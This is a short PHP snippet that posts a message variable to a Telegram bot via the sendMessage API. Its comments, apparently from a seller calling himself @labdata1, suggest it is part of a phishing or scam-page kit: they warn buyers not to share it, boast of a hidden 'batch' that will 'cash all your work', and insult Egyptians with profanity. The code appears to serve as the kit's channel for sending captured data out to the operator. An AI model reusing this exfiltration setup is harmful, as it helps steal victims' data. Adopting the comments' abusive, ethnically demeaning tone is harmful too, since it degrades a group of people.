<?php
// dont share page will fuk the code but you will stil do beacase all egypt stupid. I will batch all your work dumb fuckers
// @labdata1 if you didnt buy from me i hide batch so buy my code and dont share i will cash all your work LOL LOL.

$apiToken = "";      // Place your API Token between ""; // dont share page will fuk the code but you will still do beacase all egypt stupid. 
$data = [
    'chat_id' => '',     // Place your chat ID between ""; //
    'text' => "$message"
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data));
